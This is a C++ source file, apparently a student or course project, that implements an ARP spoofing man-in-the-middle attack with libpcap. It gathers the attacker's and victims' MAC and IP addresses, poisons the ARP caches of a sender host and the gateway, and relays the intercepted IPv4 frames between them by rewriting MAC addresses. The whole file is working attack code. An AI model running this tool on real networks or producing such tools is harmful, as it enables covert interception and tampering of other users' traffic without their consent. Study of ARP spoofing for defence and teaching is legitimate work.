#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <net/if_arp.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <thread>
#include <iostream>
#include "packetCheck.h"
#include "attackPacket.h"

using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};

AttackerMacIp AttMacIp;
STMacIp TGIp;
STMacIp SDIp;

#pragma pack(pop)

AttackerMacIp getAttackMacIp(char* ifaceName) {
	struct ifreq ifr;
	int sockFd, ret;

	// 소켓 생성
    sockFd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockFd < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

	// 인터페이스 이름 설정
    memset(&ifr, 0, sizeof(ifreq));
    strncpy(ifr.ifr_name, ifaceName, IFNAMSIZ - 1);

    // MAC 주소 가져오기
    if (ioctl(sockFd, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl - get mac");
        close(sockFd);
        exit(EXIT_FAILURE);
    }

        // MAC 주소를 문자열로 변환
    unsigned char* mac = (unsigned char*)ifr.ifr_hwaddr.sa_data;
    snprintf(AttMacIp.mac, sizeof(AttMacIp.mac),
             "%02x:%02x:%02x:%02x:%02x:%02x",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

	// IP 주소 가져오기
	if (ioctl(sockFd, SIOCGIFADDR, &ifr) < 0) {
		perror("ioctl - get ip");
		close(sockFd);
		exit(EXIT_FAILURE);
	}

	// IP 주소를 문자열로 변환
	struct sockaddr_in* ip = (struct sockaddr_in*)&ifr.ifr_addr;
	strncpy(AttMacIp.ip, inet_ntoa(ip->sin_addr), sizeof(AttMacIp.ip) - 1);
	AttMacIp.ip[sizeof(AttMacIp.ip) - 1] = '\0';

	close(sockFd);

    return AttMacIp;
}

STMacIp getMacIp(pcap_t* pcap, STMacIp* macIp, char* senderIp, char* targetIp) {
	
	EthArpPacket packet;

	packet.eth_.smac_ = Mac(AttMacIp.mac);
	packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::Size;
	packet.arp_.pln_ = Ip::Size;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(AttMacIp.mac);
	packet.arp_.sip_ = htonl(Ip(senderIp));
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(Ip(targetIp));

	int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
	}

	struct pcap_pkthdr* header;
    const uint8_t* recv_packet;

	while (true){
		int recv_res = pcap_next_ex(pcap, &header, &recv_packet);
		if ((recv_res == PCAP_ERROR) || (recv_res == PCAP_ERROR_BREAK)) {
			printf("pcap_next_ex return %d(%s)\n", recv_res, pcap_geterr(pcap));
			break;
		}
		const EthHdr* pEthHdr = reinterpret_cast<const EthHdr*>(recv_packet);
		if (ntohs(pEthHdr->type_) == EthHdr::Arp) {
			const ArpHdr* aRpHdr = reinterpret_cast<const ArpHdr*>(recv_packet + sizeof(EthHdr));
			if (aRpHdr->op_ == htons(ArpHdr::Reply) && uint32_t(aRpHdr->sip_) == htonl(Ip(targetIp)) && uint32_t(aRpHdr->tip_) == htonl(Ip(senderIp))) {
				macIp->mac = aRpHdr->smac_;
				macIp->ip = aRpHdr->sip_;
				break;
			}
		} else {
			continue;
		}
	}
	return *macIp;
}

void getAndSendPacket(pcap_t* pcap ,char* senderIp, char* targetIp) {
    while (true){
        pcap_pkthdr* header;
        const uint8_t* recv_packet;
        int recv_res = pcap_next_ex(pcap, &header, &recv_packet);
        if ((recv_res == PCAP_ERROR) || (recv_res == PCAP_ERROR_BREAK)) {
            printf("pcap_next_ex return %d(%s)\n", recv_res, pcap_geterr(pcap));
            break;
        }

        u_char* getPacket = (u_char*)malloc(header->caplen);
        memcpy(getPacket, recv_packet, header->caplen);

        EthHdr* pEthHdr = (EthHdr*) getPacket;

        if (pEthHdr->type_ == htons(EthHdr::Ip4)) {
            if (pEthHdr->smac_ == SDIp.mac) {
                pEthHdr->smac_ = Mac(AttMacIp.mac);
                pEthHdr->dmac_ = Mac(TGIp.mac);
                int res = pcap_sendpacket(pcap, getPacket, header->caplen);
                if (res != 0) {
                    fprintf(stderr, "pcap_sendpacket (SD→TG) return %d error=%s\n", res, pcap_geterr(pcap));
                }
            }
            else if (pEthHdr->smac_ == TGIp.mac) {
                pEthHdr->smac_ = Mac(AttMacIp.mac);
                pEthHdr->dmac_ = Mac(SDIp.mac);
                int res = pcap_sendpacket(pcap, getPacket, header->caplen);
                if (res != 0) {
                    fprintf(stderr, "pcap_sendpacket (TG→SD) return %d error=%s\n", res, pcap_geterr(pcap));
                }
            }
        }
        free(getPacket);
    }
}

int main(int argc, char* argv[]) {
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	char* senderIp = {0,};
	char* targetIp = {0,};
	if ((argc - 1) % 2 == 0) return -1;
	printf("dev = %s num = %d\n", dev, argc);

	pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (pcap == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return EXIT_FAILURE;
	}

	// 공격자의 mac, ip 주소 구하기
	getAttackMacIp(dev);

	for (int i = 2; i < argc; i += 2) {
		
		senderIp = argv[i];
		targetIp = argv[i+1];
			
		printf("attacker mac is %s\n", AttMacIp.mac);
		printf("attacker ip is %s\n", AttMacIp.ip);

		getMacIp(pcap, &SDIp, targetIp, senderIp);

		const u_char* SDMac = reinterpret_cast<const u_char*>(&SDIp.mac);
		printf("sender mac is %02x:%02x:%02x:%02x:%02x:%02x\n", SDMac[0], SDMac[1], SDMac[2], SDMac[3], SDMac[4], SDMac[5]);
		printf("sender ip is %d.%d.%d.%d\n",ntohl(SDIp.ip << 24)&0xFF,ntohl(SDIp.ip << 16)&0xFF,ntohl(SDIp.ip << 8)&0xFF,ntohl(SDIp.ip)&0xFF);

		getMacIp(pcap, &TGIp, senderIp, targetIp);
		
		const u_char* TGMac = reinterpret_cast<const u_char*>(&TGIp.mac);
		printf("gateway mac is %02x:%02x:%02x:%02x:%02x:%02x\n", TGMac[0], TGMac[1], TGMac[2], TGMac[3], TGMac[4], TGMac[5]);
		printf("gateway ip is %d.%d.%d.%d\n",ntohl(TGIp.ip << 24)&0xFF,ntohl(TGIp.ip << 16)&0xFF,ntohl(TGIp.ip << 8)&0xFF,ntohl(TGIp.ip)&0xFF);
		
		std::thread startPacketCheck(packetCheck, dev, SDIp, TGIp, AttMacIp, argv[i], argv[i + 1]);
		startPacketCheck.detach();

		if(attackPacket(pcap, SDIp, AttMacIp, senderIp, targetIp)) {
			pcap_close(pcap);
			return -1;
		}
		if(attackPacket(pcap, TGIp, AttMacIp, targetIp, senderIp)) {
			pcap_close(pcap);
			return -1;
		}

		getAndSendPacket(pcap, argv[i], argv[i+1]);
	}

	pcap_close(pcap);
}